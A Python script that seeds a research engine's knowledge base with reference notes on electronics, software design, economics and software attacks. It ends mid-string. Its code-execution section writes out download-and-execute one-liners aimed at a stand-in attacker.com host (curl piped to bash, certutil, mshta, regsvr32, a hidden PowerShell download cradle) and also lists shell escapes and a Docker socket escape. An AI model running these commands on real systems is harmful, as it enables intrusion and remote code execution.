#!/usr/bin/env python3
"""
Knowledge Base Seed Script for PRAG Multi-Domain Research Engine.
Generates curated, high-quality reference documents for:
  - Electronics & Embedded Systems
  - Software Engineering & Architecture
  - Economics & Finance
Places them in knowledge_base/ for ingestion into the vector DB as Tier 1.0 sources.
"""

import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
KB_DIR = os.path.join(BASE_DIR, "knowledge_base")


SEED_DOCUMENTS = {
    # ═══ Electronics & Embedded Systems ═══
    "Documentation/ee_formulas_reference.md": """# Electronics Engineering Formulas & Reference

## Ohm's Law
- **V = I × R** — Voltage (V) = Current (A) × Resistance (Ω)
- **I = V / R** — Current = Voltage / Resistance
- **R = V / I** — Resistance = Voltage / Current
- **P = V × I** — Power (W) = Voltage × Current
- **P = I² × R** — Power = Current² × Resistance
- **P = V² / R** — Power = Voltage² / Resistance

## Kirchhoff's Laws
- **KCL (Current Law):** Sum of currents entering a node = sum of currents leaving. ΣI_in = ΣI_out
- **KVL (Voltage Law):** Sum of voltage drops around any closed loop = 0. ΣV = 0

## Thevenin & Norton Equivalents
- **Thevenin:** Any linear circuit → single voltage source Vth in series with Rth
  - Vth = open-circuit voltage at terminals
  - Rth = equivalent resistance with sources zeroed (voltage→short, current→open)
- **Norton:** Any linear circuit → current source In in parallel with Rn
  - In = short-circuit current at terminals, Rn = Rth

## Voltage Divider
- **Vout = Vin × R2 / (R1 + R2)**
- Used for level shifting, biasing, and sensor interfacing

## Current Divider
- **I1 = Itotal × R2 / (R1 + R2)** — for two parallel resistors

## RC Circuits
- **Time Constant:** τ = R × C
- **Charging:** V(t) = Vs × (1 - e^(-t/τ))
- **Discharging:** V(t) = V0 × e^(-t/τ)
- 1τ ≈ 63.2%, 3τ ≈ 95%, 5τ ≈ 99.3% of final value
- **Cutoff Frequency:** fc = 1 / (2π × R × C)

## RL Circuits
- **Time Constant:** τ = L / R
- **Cutoff Frequency:** fc = R / (2π × L)

## Capacitive & Inductive Reactance
- **Xc = 1 / (2πfC)** — Capacitive reactance (Ω)
- **Xl = 2πfL** — Inductive reactance (Ω)
- **Impedance (series RLC):** Z = √(R² + (Xl - Xc)²)
- **Resonant Frequency:** f0 = 1 / (2π√(LC))

## Decibel Conversions
- **Voltage gain:** dB = 20 × log₁₀(Vout/Vin)
- **Power gain:** dB = 10 × log₁₀(Pout/Pin)
- **dBm:** Power relative to 1mW → dBm = 10 × log₁₀(P_mW)
  - 0 dBm = 1 mW, 3 dBm ≈ 2 mW, 10 dBm = 10 mW, 20 dBm = 100 mW, 30 dBm = 1 W

## SI Unit Prefixes
| Prefix | Symbol | Multiplier |
|--------|--------|-----------|
| pico   | p      | 10⁻¹²    |
| nano   | n      | 10⁻⁹     |
| micro  | µ      | 10⁻⁶     |
| milli  | m      | 10⁻³     |
| kilo   | k      | 10³      |
| mega   | M      | 10⁶      |
| giga   | G      | 10⁹      |

## Op-Amp Configurations
- **Inverting:** Vout = -Vin × (Rf / Rin), Input impedance = Rin
- **Non-inverting:** Vout = Vin × (1 + Rf / Rin), Input impedance = very high
- **Voltage Follower:** Vout = Vin (unity gain buffer), Gain = 1
- **Summing Amplifier:** Vout = -(V1/R1 + V2/R2 + ...) × Rf
- **Difference Amplifier:** Vout = (V2 - V1) × Rf/Rin

## Transistor Biasing (BJT)
- **Active region:** Vbe ≈ 0.7V (Si), Ic = β × Ib
- **Saturation:** Vce_sat ≈ 0.2-0.3V
- **Common-Emitter voltage gain:** Av ≈ -Rc / Re (with bypass) or -gm × Rc

## MOSFET Operating Regions
- **Cutoff:** Vgs < Vth → Id = 0
- **Linear/Triode:** Vgs > Vth AND Vds < Vgs-Vth → Id = µn×Cox×(W/L)×[(Vgs-Vth)×Vds - Vds²/2]
- **Saturation:** Vgs > Vth AND Vds ≥ Vgs-Vth → Id = (µn×Cox/2)×(W/L)×(Vgs-Vth)²
""",

    "Documentation/ee_protocols_reference.md": """# Communication Protocols Quick Reference

## I2C (Inter-Integrated Circuit)
- **Wires:** 2 (SDA data, SCL clock) + GND
- **Speed:** Standard 100kHz, Fast 400kHz, Fast+ 1MHz, High 3.4MHz
- **Addressing:** 7-bit (128 devices) or 10-bit (1024 devices)
- **Pull-up resistors:** Required on SDA and SCL (typically 4.7kΩ for 100kHz, 2.2kΩ for 400kHz)
- **Topology:** Multi-master, multi-slave bus
- **Max bus length:** ~1m (depends on capacitance, <400pF recommended)
- **Start condition:** SDA goes LOW while SCL is HIGH
- **Stop condition:** SDA goes HIGH while SCL is HIGH

## SPI (Serial Peripheral Interface)
- **Wires:** 4 (MOSI, MISO, SCK, CS/SS) + GND
- **Speed:** Up to 50+ MHz (device dependent)
- **Modes:** 4 modes based on CPOL and CPHA
  - Mode 0: CPOL=0, CPHA=0 (most common)
  - Mode 1: CPOL=0, CPHA=1
  - Mode 2: CPOL=1, CPHA=0
  - Mode 3: CPOL=1, CPHA=1
- **Topology:** Single master, multiple slaves (one CS per slave)
- **Full-duplex:** Yes, simultaneous bidirectional

## UART (Universal Asynchronous Receiver-Transmitter)
- **Wires:** 2 (TX, RX) + GND
- **Common Baud Rates:** 9600, 19200, 38400, 57600, 115200, 921600
- **Frame:** Start bit + 8 data bits + optional parity + 1-2 stop bits
- **Flow Control:** None, Hardware (RTS/CTS), Software (XON/XOFF)
- **Voltage Levels:** TTL (3.3V/5V), RS-232 (±12V)
- **Max distance:** RS-232 ~15m, RS-485 ~1200m

## CAN Bus (Controller Area Network)
- **Wires:** 2 (CANH, CANL) differential pair + GND
- **Speed:** Standard 1 Mbps, CAN FD up to 8 Mbps
- **Topology:** Multi-master bus with priority-based arbitration
- **Message-based:** No addressing, uses message IDs for filtering
- **Termination:** 120Ω resistors at each end of bus
- **Used in:** Automotive, industrial automation, robotics

## PWM (Pulse Width Modulation)
- **Duty Cycle:** Percentage of period signal is HIGH
- **Average Voltage:** Vavg = Vmax × duty_cycle
- **Resolution:** Depends on timer bits (8-bit = 256 levels, 16-bit = 65536)
- **Common uses:** Motor speed control, LED dimming, servo positioning, DAC approximation
- **Servo motors:** Typically 50Hz, 1ms-2ms pulse width for 0°-180°

## USB Standards
| Version | Speed | Max Power |
|---------|-------|-----------|
| USB 2.0 | 480 Mbps | 2.5W (5V/500mA) |
| USB 3.0 | 5 Gbps | 4.5W (5V/900mA) |
| USB 3.1 | 10 Gbps | 100W (USB-PD) |
| USB 4.0 | 40 Gbps | 100W (USB-PD) |
""",

    "Documentation/ee_microcontrollers_comparison.md": """# Microcontroller Comparison Guide

## Arduino Ecosystem
| Board | MCU | Clock | Flash | RAM | GPIO | ADC | Price |
|-------|-----|-------|-------|-----|------|-----|-------|
| Uno R3 | ATmega328P | 16MHz | 32KB | 2KB | 20 | 6ch 10-bit | ~$5 |
| Mega 2560 | ATmega2560 | 16MHz | 256KB | 8KB | 54 | 16ch 10-bit | ~$10 |
| Nano | ATmega328P | 16MHz | 32KB | 2KB | 22 | 8ch 10-bit | ~$3 |
| Due | SAM3X8E (ARM) | 84MHz | 512KB | 96KB | 54 | 12ch 12-bit | ~$15 |

## ESP32 Family
| Variant | Core | Clock | Flash | RAM | WiFi | BLE | Price |
|---------|------|-------|-------|-----|------|-----|-------|
| ESP32 | Dual Xtensa | 240MHz | 4MB | 520KB | 802.11b/g/n | 4.2 | ~$3 |
| ESP32-S3 | Dual Xtensa | 240MHz | 8-16MB | 512KB | 802.11b/g/n | 5.0 | ~$4 |
| ESP32-C3 | RISC-V | 160MHz | 4MB | 400KB | 802.11b/g/n | 5.0 | ~$2 |

## STM32 Series
| Series | Core | Clock | Use Case |
|--------|------|-------|----------|
| STM32F0 | Cortex-M0 | 48MHz | Low-cost, simple applications |
| STM32F1 | Cortex-M3 | 72MHz | General purpose, widely used |
| STM32F4 | Cortex-M4F | 168-180MHz | DSP, advanced applications |
| STM32H7 | Cortex-M7 | 480MHz | High performance, dual-core |
| STM32L4 | Cortex-M4 | 80MHz | Ultra-low-power |

## Raspberry Pi Pico
- **MCU:** RP2040, Dual-core ARM Cortex-M0+ @ 133MHz
- **Memory:** 264KB SRAM, 2MB Flash
- **GPIO:** 26 multi-function pins
- **ADC:** 3ch 12-bit
- **Programmable I/O:** 8 state machines for custom protocols
- **Price:** ~$4
- **Language support:** MicroPython, CircuitPython, C/C++

## Key Selection Criteria
1. **Processing power:** ARM Cortex-M4/M7 for DSP/motor control
2. **Connectivity:** ESP32 for WiFi/BLE, nRF52 for BLE-only
3. **Power consumption:** STM32L series for battery devices
4. **Cost:** ESP32-C3 (~$2), ATtiny (~$1) for high-volume
5. **Ecosystem:** Arduino for prototyping, STM32 for production
6. **Real-time:** Use MCU with hardware timers, DMA, interrupt priorities
""",

    # ═══ Software Engineering ═══
    "Documentation/software_design_patterns.md": """# Software Design Patterns Reference

## Creational Patterns
### Singleton
Ensures a class has only one instance with global access point.
```python
class Singleton:
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
```
**Use when:** Database connections, configuration managers, logging.

### Factory Method
Creates objects without specifying exact class.
```python
class NotificationFactory:
    @staticmethod
    def create(channel: str) -> Notification:
        if channel == "email": return EmailNotification()
        if channel == "sms": return SMSNotification()
        raise ValueError(f"Unknown channel: {channel}")
```
**Use when:** Object creation logic is complex or varies by context.

### Builder
Constructs complex objects step by step.
**Use when:** Objects have many optional parameters (query builders, config).

## Structural Patterns
### Adapter
Converts interface of one class to another expected interface.
**Use when:** Integrating legacy code, third-party libraries.

### Decorator
Adds behavior to objects dynamically without modifying original class.
```python
def retry(max_attempts=3):
    def decorator(func):
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try: return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1: raise
        return wrapper
    return decorator
```

### Facade
Provides simplified interface to complex subsystem.
**Use when:** Wrapping complex libraries, simplifying API surface.

## Behavioral Patterns
### Observer (Pub/Sub)
Objects subscribe to events and get notified on state changes.
**Use when:** Event systems, UI updates, message broadcasting.

### Strategy
Defines family of interchangeable algorithms.
```python
class SortStrategy(Protocol):
    def sort(self, data: list) -> list: ...

class QuickSort:
    def sort(self, data): return sorted(data)

class Sorter:
    def __init__(self, strategy: SortStrategy):
        self.strategy = strategy
    def sort(self, data): return self.strategy.sort(data)
```

### Command
Encapsulates request as object, enabling undo/redo, queuing, logging.
**Use when:** Transaction systems, macro recording, task queues.

## SOLID Principles
- **S** — Single Responsibility: Each class has one reason to change
- **O** — Open/Closed: Open for extension, closed for modification
- **L** — Liskov Substitution: Subtypes must be substitutable for base types
- **I** — Interface Segregation: Many specific interfaces > one general interface
- **D** — Dependency Inversion: Depend on abstractions, not concretions
""",

    "Documentation/system_design_reference.md": """# System Design & Architecture Reference

## Scalability Patterns
### Horizontal vs Vertical Scaling
- **Vertical:** Add more CPU/RAM to single machine. Simple but limited.
- **Horizontal:** Add more machines. Complex but infinite scalability.

### Load Balancing Strategies
- **Round Robin:** Distribute requests sequentially
- **Least Connections:** Route to server with fewest active connections
- **IP Hash:** Same client always hits same server (session affinity)
- **Weighted:** Distribute based on server capacity

### Caching Strategies
- **Cache-Aside:** App checks cache first, loads from DB on miss
- **Write-Through:** Write to cache AND DB simultaneously
- **Write-Behind:** Write to cache, async flush to DB
- **Cache Eviction:** LRU (Least Recently Used), LFU, TTL-based

### Database Scaling
- **Read Replicas:** Primary for writes, replicas for reads
- **Sharding:** Partition data across multiple databases
  - Hash-based: Consistent hashing on key
  - Range-based: Partition by value ranges
- **Connection Pooling:** Reuse database connections (PgBouncer, HikariCP)

## API Design Best Practices
### REST
- Use nouns for resources: `/users`, `/orders/{id}`
- HTTP verbs: GET (read), POST (create), PUT (update), DELETE (remove)
- Status codes: 200 OK, 201 Created, 400 Bad Request, 404 Not Found, 500 Server Error
- Pagination: `?page=1&limit=20` or cursor-based
- Versioning: URL (`/api/v2/`), header, or query param

### Rate Limiting
- **Token Bucket:** Tokens added at fixed rate, consumed per request
- **Sliding Window:** Track requests in rolling time window
- **Leaky Bucket:** Queue requests, process at fixed rate

## Database Selection Guide
| Use Case | Recommended | Why |
|----------|-------------|-----|
| ACID transactions | PostgreSQL | Full SQL, MVCC, extensions |
| High-speed cache | Redis | In-memory, sub-ms latency |
| Document store | MongoDB | Flexible schema, JSON native |
| Search engine | Elasticsearch | Full-text search, analytics |
| Time series | InfluxDB/TimescaleDB | Optimized for temporal data |
| Graph relations | Neo4j | Relationship-first queries |

## Message Queue Patterns
- **Work Queue:** Multiple workers consume from single queue (task distribution)
- **Pub/Sub:** Publishers broadcast to all subscribers (event notification)
- **Request-Reply:** Synchronous RPC over async transport
- **Dead Letter Queue:** Failed messages routed for investigation

## CI/CD Pipeline Stages
1. **Source:** Git push triggers pipeline
2. **Build:** Compile, install dependencies
3. **Test:** Unit → Integration → E2E
4. **Security:** SAST, dependency scanning
5. **Deploy:** Staging → Canary → Production
6. **Monitor:** Logs, metrics, alerts, rollback triggers
""",

    # ═══ Economics & Finance ═══
    "Documentation/economics_fundamentals.md": """# Economics Fundamentals Reference

## Core Concepts
### Supply and Demand
- **Law of Demand:** Price ↑ → Quantity demanded ↓ (inverse relationship)
- **Law of Supply:** Price ↑ → Quantity supplied ↑ (direct relationship)
- **Equilibrium:** Where supply curve meets demand curve
- **Surplus:** Quantity supplied > quantity demanded (price too high)
- **Shortage:** Quantity demanded > quantity supplied (price too low)

### Elasticity
- **Price Elasticity of Demand:** Ed = % change in Qd / % change in P
  - |Ed| > 1: Elastic (luxury goods)
  - |Ed| < 1: Inelastic (necessities, fuel, medicine)
  - |Ed| = 1: Unit elastic
- **Income Elasticity:** Normal goods (>0), Inferior goods (<0)
- **Cross-Price Elasticity:** Substitutes (>0), Complements (<0)

### Market Structures
| Structure | Firms | Product | Entry Barriers | Price Control | Examples |
|-----------|-------|---------|-----------------|---------------|----------|
| Perfect Competition | Many | Identical | None | None (price taker) | Agriculture |
| Monopolistic Competition | Many | Differentiated | Low | Some | Restaurants |
| Oligopoly | Few | Similar/Different | High | Significant | Airlines, Telecom |
| Monopoly | One | Unique | Very High | Full | Utilities (regulated) |

## Macroeconomics
### GDP (Gross Domestic Product)
- **GDP = C + I + G + (X - M)**
  - C = Consumer spending, I = Investment, G = Government spending
  - X = Exports, M = Imports
- **Real GDP:** Adjusted for inflation (constant prices)
- **Nominal GDP:** At current prices (not inflation-adjusted)
- **GDP per capita:** GDP / Population (standard of living indicator)

### Inflation
- **CPI (Consumer Price Index):** Measures average price change of consumer basket
- **Inflation rate:** ((CPI_current - CPI_previous) / CPI_previous) × 100
- **Causes:** Demand-pull (excess demand), Cost-push (rising input costs), Monetary (money supply growth)
- **Fisher Equation:** Nominal rate ≈ Real rate + Inflation rate

### Monetary Policy (Central Bank)
- **Expansionary:** Lower interest rates → more borrowing → economic growth
- **Contractionary:** Raise interest rates → less borrowing → slow inflation
- **Quantitative Easing:** Central bank buys securities → injects money → lowers long-term rates
- **Reserve Requirements:** Minimum reserves banks must hold

### Fiscal Policy (Government)
- **Expansionary:** Increase spending / cut taxes → stimulate economy
- **Contractionary:** Cut spending / raise taxes → reduce inflation/deficit
- **Multiplier Effect:** $1 of government spending → >$1 GDP increase
- **Crowding Out:** Government borrowing → higher interest rates → reduced private investment

## Financial Mathematics
### Time Value of Money
- **Present Value:** PV = FV / (1 + r)^n
- **Future Value:** FV = PV × (1 + r)^n
- **NPV:** NPV = Σ [CF_t / (1 + r)^t] - Initial Investment
  - NPV > 0: Accept project, NPV < 0: Reject project
- **IRR:** Discount rate that makes NPV = 0

### Compound Interest
- **A = P × (1 + r/n)^(nt)**
  - P = Principal, r = Annual rate, n = Compounding frequency, t = Years
- **Continuous compounding:** A = P × e^(rt)
- **Rule of 72:** Years to double ≈ 72 / interest_rate_percent

### Investment Metrics
- **ROI:** (Gain - Cost) / Cost × 100%
- **P/E Ratio:** Stock Price / Earnings Per Share
- **Sharpe Ratio:** (Return - Risk-free rate) / Standard deviation
- **WACC:** Weighted Average Cost of Capital = E/V×Re + D/V×Rd×(1-Tc)

### Risk & Portfolio Theory
- **Diversification:** Combining uncorrelated assets reduces portfolio risk
- **Beta:** Measures systematic risk relative to market (β=1 = market risk)
- **Alpha:** Excess return above expected (based on risk)
- **Efficient Frontier:** Set of optimal portfolios maximizing return for given risk
""",

    # ═══ Software Attacks & Code Execution Vectors ═══
    "Documentation/software_attacks_taxonomy.md": """# Comprehensive Taxonomy of Software Attacks

## 1. Memory Safety & Binary Attacks
- **Stack Buffer Overflow:** Writing data beyond the allocated stack buffer boundaries to overwrite adjacent memory, including stack canaries, saved base pointer (EBP/RBP), and the return instruction pointer (EIP/RIP) to divert control flow.
- **Heap Buffer Overflow:** Overwriting heap chunk metadata (e.g., chunk size, prev_size, fd/bk pointers in dlmalloc/ptmalloc) or adjacent heap objects to corrupt function pointers, vtables, or application state.
- **Use-After-Free (UAF):** Accessing memory after it has been deallocated via `free()` without zeroing the pointer. Attackers allocate new controlled objects into the freed chunk location and trigger virtual method calls or pointer dereferences via the dangling pointer.
- **Double Free:** Freeing the same allocated memory block twice, corrupting heap bin linked lists (e.g., tcache or fastbin poisoning) and leading to arbitrary write primitives or overlapping chunks.
- **Format String Vulnerability:** Passing user-controlled input directly to formatted output functions (`printf`, `sprintf`, `syslog`) without format specifiers, enabling arbitrary memory read via `%x`, `%s` and arbitrary memory write via `%n` specifiers.
- **Integer Overflow & Underflow:** Arithmetic operations exceeding the maximum or minimum representable integer values (e.g., 32-bit `0xFFFFFFFF + 1 = 0`), leading to undersized memory allocations followed by buffer overflows.
- **Type Confusion:** Accessing a memory structure or object using a type incompatible with its actual allocation, causing misinterpretation of fields and pointer dereferences to attacker-controlled memory.
- **Null Pointer Dereference:** Dereferencing a NULL pointer; can cause denial of service or, in kernel contexts with mmap_min_addr = 0, privilege escalation.

## 2. Injection & Dynamic Code Evaluation Attacks
- **SQL Injection (SQLi):** Inserting malicious SQL fragments into database queries due to lack of parameterized inputs. Subtypes: In-band (UNION-based, Error-based), Blind (Boolean-based, Time-based), Out-of-band (DNS exfiltration).
- **Command Injection (OS Command Injection):** Injecting shell metacharacters (`;`, `|`, `&&`, `` ` `` , `$()`) into system execution calls (`system()`, `popen()`, `exec()`, `eval()`) to execute arbitrary host commands with the process's privilege.
- **NoSQL Injection:** Injecting MongoDB/CouchDB query operators (e.g., `{"$gt": ""}`, `{"$where": "..."}`) into unvalidated JSON input to bypass authentication or extract sensitive records.
- **Server-Side Template Injection (SSTI):** Injecting template engine syntax (`{{...}}`, `${...}`, `<%...%>`) into web templates (Jinja2, Twig, Velocity, Freemarker, Thymeleaf), escalating from variable evaluation to sandbox escapes and Remote Code Execution (RCE).
- **LDAP & XPath Injection:** Manipulating directory service or XML query filters by injecting filter control characters (`*`, `)(cn=*`, `' or '1'='1`) to bypass authentication or enumerate attributes.
- **Cross-Site Scripting (XSS):** Injecting client-side JavaScript into web applications. Subtypes: Stored XSS (persisted in database), Reflected XSS (mirrored in immediate response), DOM-based XSS (executed via insecure client JavaScript sinks like `innerHTML` or `eval()`).

## 3. Broken Access Control & Authentication Attacks
- **Insecure Direct Object References (IDOR):** Accessing internal object identifiers (user IDs, file paths, database primary keys) directly in URLs or API requests without server-side authorization checks.
- **Privilege Escalation:**
  - *Vertical Privilege Escalation:* Standard user gaining administrative or root privileges.
  - *Horizontal Privilege Escalation:* User accessing resources belonging to another user with the same role level.
- **JSON Web Token (JWT) Attacks:** Signature algorithm confusion (changing `RS256` to `HS256` using the public key as HMAC secret), `none` algorithm bypass, weak HMAC secret brute-forcing, and JWK/JKU header injection.
- **Session Fixation & Hijacking:** Forcing a known session identifier onto a victim before login, or stealing session tokens via XSS, network sniffing, or predictable token generation.
- **Path Traversal / Directory Traversal:** Using dot-dot-slash sequences (`../`, `..\`, `%2e%2e%2f`) to escape intended webroot boundaries and read sensitive files (`/etc/passwd`, configuration files).

## 4. Server-Side Infrastructure & Serialization Attacks
- **Server-Side Request Forgery (SSRF):** Forcing a backend server to generate HTTP requests to unauthorized destinations (e.g., cloud metadata endpoints `http://169.254.169.254/latest/meta-data/`, internal microservices, loopback `127.0.0.1`).
- **XML External Entity (XXE) Injection:** Exploiting weakly configured XML parsers that process DOCTYPE external entity declarations (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`), leading to local file disclosure, SSRF, or DoS (Billion Laughs attack).
- **Insecure Deserialization:** Reconstructing serialized objects from untrusted byte streams (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize()`, Ruby `Marshal`), triggering execution gadget chains resulting in full RCE.
- **HTTP Request Smuggling:** Desynchronizing front-end reverse proxies and backend web servers due to discrepancies in parsing `Content-Length` and `Transfer-Encoding: chunked` headers (CL.TE, TE.CL, TE.TE), leading to request hijacking and cache poisoning.

## 5. Software Supply Chain & CI/CD Attacks
- **Dependency Confusion:** Registering public packages on public repositories (PyPI, npm, RubyGems) with the same names as internal proprietary packages, causing package managers to download the malicious public versions.
- **Typosquatting:** Publishing packages with names very similar to popular libraries (e.g., `reqeusts` vs `requests`) containing backdoors or infostealers.
- **CI/CD Pipeline Poisoning:** Compromising automated build workflows (GitHub Actions, GitLab CI, Jenkins) via malicious PRs, exposed secrets, or vulnerable action runner scripts.
- **Source Code Backdooring & Build Tampering:** Modifying build artifacts during compilation or compromising developer signing keys to distribute signed malicious software updates.

## 6. Cryptographic & Protocol Attacks
- **Padding Oracle Attack:** Exploiting CBC mode decryption error messages (padding valid vs invalid) to decrypt ciphertext block-by-block without the key or forge valid ciphertexts.
- **Replay Attacks:** Intercepting valid signed transmission tokens or API requests and re-transmitting them to repeat unauthorized actions (mitigated via nonces, timestamps, and TLS).
- **Cryptographic Downgrade Attacks:** Forcing protocols (e.g., SSL/TLS, SSH) to negotiate older, cryptographically vulnerable cipher suites or protocol versions.
- **Regular Expression Denial of Service (ReDoS):** Supplying strings that cause catastrophic backtracking in exponential regex patterns (e.g., `(a+)+$`), freezing CPU resources.
""",

    "Documentation/code_execution_sources_and_vectors.md": """# Code Execution Sources & Exploitation Vectors Reference

## 1. Code Execution Primitives & Scope Definitions
- **Remote Code Execution (RCE):** The ability of an attacker to execute arbitrary machine instructions or shell commands on a target host across a network interface without prior authentication or with limited user privileges.
- **Arbitrary Code Execution (ACE):** Execution of arbitrary machine instructions within the context and address space of a target vulnerable process on the local or remote machine.
- **Local Privilege Escalation (LPE):** Exploiting local software bugs, misconfigurations, or kernel vulnerabilities to elevate execution privileges from standard user permissions to root/SYSTEM/kernel context.
- **Command Execution vs Code Execution:**
  - *Command Execution:* Passing arguments to an underlying operating system shell (`/bin/sh -c`, `cmd.exe /c`, `powershell.exe`) to execute existing binaries and scripts.
  - *Code Execution / Shellcode Execution:* Injecting raw machine instructions directly into process memory and transferring the instruction pointer (`EIP`/`RIP`) to that address.

## 2. Living Off The Land Binaries (LOLBins & GTFOBins)
LOLBins are legitimate, trusted system binaries pre-installed on the OS used by attackers to bypass application whitelisting and execute code, download payloads, or elevate privileges without dropping custom malware.

### Linux / Unix GTFOBins Execution Primitives
- **Sudo / SUID Abuse:** Executing binaries configured with `NOPASSWD` sudo rules or SUID bits:
  - `awk 'BEGIN {system("/bin/sh")}'`
  - `find . -exec /bin/sh \; -quit`
  - `python3 -c 'import os; os.system("/bin/sh")'`
  - `vim -c ':!/bin/sh'`
  - `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- **File Download & Memory Execution:**
  - `curl -s http://attacker.com/payload.sh | bash`
  - `wget -qO- http://attacker.com/payload.py | python3`
- **Capabilities Exploitation:** Binaries with `cap_setuid` or `cap_sys_admin` capabilities allowing instant UID 0 switching (e.g. `gdb`, `python3`, `perl`).

### Windows LOLBins Execution Primitives
- **certutil.exe:** Payload download and base64 decode:
  `certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe`
- **rundll32.exe:** DLL entry point execution and inline JavaScript execution:
  `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)`
- **mshta.exe:** Direct HTA / VBScript / JScript execution via remote URL:
  `mshta.exe http://attacker.com/payload.hta`
- **powershell.exe:** In-memory execution bypassing execution policies:
  `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"`
- **regsvr32.exe (Squiblydoo):** COM scriptlet execution bypassing AppLocker:
  `regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll`

## 3. Shared Library & Dynamic Link Library (DLL) Injection

### Linux Shared Object Injection
- **LD_PRELOAD Hijacking:** Environment variable specifying dynamic libraries to load before standard C libraries. Overriding standard library functions (`geteuid`, `fopen`, `puts`) executes custom C code before `main()`.
- **LD_LIBRARY_PATH & RPATH/RUNPATH Misconfiguration:** Insecure search paths allowing write access to library directories searched before `/lib` or `/usr/lib`.
- **`/etc/ld.so.preload`:** Global system-wide library preloading file for root-level persistence.

### Windows DLL Injection & Hijacking
- **DLL Search Order Hijacking:** Exploiting the search order used by Windows when resolving DLLs (Application Directory -> System32 -> Windows -> CWD -> PATH) to load malicious DLLs placed in higher-priority folders.
- **DLL Side-Loading:** Placing a malicious DLL alongside a digitally signed legitimate executable, tricking the trusted executable into loading the attacker DLL.

## 4. Process Injection & Memory Execution Techniques
- **Classic DLL Injection:** `OpenProcess()` -> `VirtualAllocEx()` -> `WriteProcessMemory()` -> `CreateRemoteThread(LoadLibraryA)`.
- **Process Hollowing (RunPE):** Spawning a legitimate process in suspended state (`CREATE_SUSPENDED`), unmapping original code via `NtUnmapViewOfSection()`, allocating RWX memory, writing malicious PE sections, and updating RIP via `SetThreadContext()` before resuming.
- **Reflective DLL Loading:** Loading a DLL entirely from memory without writing it to disk or registering it in the PEB module list.
- **Linux `memfd_create` In-Memory Execution:** Creating an anonymous file in RAM via `memfd_create()`, writing an ELF binary, and executing via `fexecve()` without any disk footprint.

## 5. Insecure Deserialization Gadget Chains
- **Python Pickle RCE:** Python's `pickle` module executes arbitrary code via the `__reduce__` magic method.
- **Java Object Deserialization (ysoserial):** `ObjectInputStream.readObject()` triggers nested gadget chains (Apache Commons Collections, Spring, Jackson) executing `Runtime.getRuntime().exec()`.
- **PHP Object Injection:** `unserialize()` triggers `__wakeup()`, `__destruct()`, `__toString()`, enabling command execution.

## 6. Container & Virtualization Escapes
- **Exposed Docker Socket (`/var/run/docker.sock`):** Mounting host Docker socket allows spawning new containers with host root filesystem mounted (`docker run -v /:/host -it alpine chroot /host`).
- **Privileged Containers (`--privileged`):** Grants container full Linux capabilities (`CAP_SYS_ADMIN`, raw disk access), allowing direct mounting of host block devices.
- **cgroup `release_agent` Escape:** In containers with `CAP_SYS_ADMIN` and cgroup v1, setting `release_agent` executes a host script upon cgroup cleanup.
""",

    "Documentation/binary_exploitation_and_memory_attacks.md": """# Binary Exploitation & Memory Corruption Attacks Reference

## 1. Stack Buffer Overflows & Return Address Overwrite
- **Instruction Pointer Hijacking:** Input exceeds buffer allocation, overwriting Saved EBP and Saved EIP/RIP. When the function executes `ret`, the CPU pops the attacker's value into the instruction pointer.
- **NOP Sled & Shellcode:** In architectures without NX (No-Execute), an array of `\\x90` (NOP) instructions precedes raw shellcode.
- **Return-to-libc (ret2libc):** When NX is enabled, execution cannot occur on the stack. Attackers overwrite RIP with the address of `system()` in `libc.so`, arranging arguments (`/bin/sh` string pointer) into registers or stack slots.

## 2. Return-Oriented Programming (ROP)
ROP bypasses DEP/NX (Data Execution Prevention) by chaining small snippets of existing executable code ("gadgets") ending in `ret` instructions.
- **Gadget Chaining:** Each `ret` instruction pops the next 8-byte address from the stack into `RIP`.
- **x86_64 Calling Convention Example (spawning `/bin/sh` via `execve`):**
  1. `rax` = `0x3b` (syscall 59 for `sys_execve`)
  2. `rdi` = pointer to `"/bin/sh"` string
  3. `rsi` = `0` (`NULL` argv)
  4. `rdx` = `0` (`NULL` envp)
  5. `syscall` gadget
- **Stack Pivoting:** Overwriting `RSP`/`ESP` with `xchg rsp, rax; ret` to point the stack pointer to an attacker-controlled heap or mmap buffer.

## 3. Heap Exploitation & Dynamic Memory Flaws
- **Use-After-Free (UAF):** An application deallocates an object with `free()` but fails to clear the pointer. When a new object of identical size is allocated, the memory allocator returns the same chunk, letting an attacker control vtables or function pointers.
- **Double Free:** Freeing a chunk twice places the same address into bin linked lists multiple times, creating overlapping allocations and arbitrary write primitives.
- **Tcache / Fastbin Poisoning:** Overwriting the forward pointer (`fd`) of a freed chunk in tcache/fastbin via heap overflow or UAF to force `malloc()` to return an arbitrary target address (`__free_hook`, GOT entry).
- **Heap Spraying:** Allocating massive numbers of identical objects containing NOP sleds and shellcode into the heap to make memory layout predictable when ASLR is active.

## 4. Format String Attacks
Occurs when user-supplied strings are passed directly as the format argument to functions like `printf(user_input)`:
- **Arbitrary Memory Reading:** `%x` / `%p` leaks stack values and canaries; `%s` dereferences pointers on stack; `%n$p` reads positional arguments.
- **Arbitrary Memory Writing (`%n`):** Writes the number of characters printed so far into the integer pointer argument; `%hn` (2 bytes), `%hhn` (1 byte). Used to overwrite GOT entries.

## 5. Integer Flaws & Arithmetic Truncation
- **Integer Overflow/Underflow:** Arithmetic wrapping around boundaries (`0xFFFFFFFF + 1 = 0`).
- **Signed vs Unsigned Mismatch:** Treating a signed negative integer as unsigned, causing `memcpy(dest, src, length)` to interpret negative length as huge positive byte count.
- **Off-By-One (Poison Null Byte):** Writing a single byte past array bounds to clear `PREV_INUSE` bit in heap chunks, triggering backward consolidation into in-use chunks.

## 6. Binary Exploit Mitigations & Bypass Strategies
- **ASLR (Address Space Layout Randomization):** Randomizes stack, heap, and library base addresses. Bypassed via memory leak / information disclosure to calculate libc base.
